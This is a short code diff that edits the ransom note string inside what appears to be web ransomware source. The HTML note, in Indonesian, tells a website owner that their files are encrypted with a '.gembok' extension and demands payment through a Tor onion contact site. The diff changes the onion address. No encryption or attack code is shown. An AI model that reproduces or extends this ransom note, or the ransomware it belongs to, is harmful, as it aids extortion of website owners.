@@ -19,7 +19,7 @@ ransom_note = """
 <h1>♠ DATA ANDA TERENKRIPSI! ♠</h1>
 <p>Website anda kenak .gembok</p>
 <p>Yuk bayar kuncinya di onion site kami :)
-http://xb6q2aggycmlcrjtbjendcnnwpmmwbosqaugxsqbracujntika2us.onion/contact</p>
+xb6q2addgyalcrasdtbasdcnnwpmmwbosqaugxsqbracujntika2us.onion/contact</p>
 </body></html>
 """
 
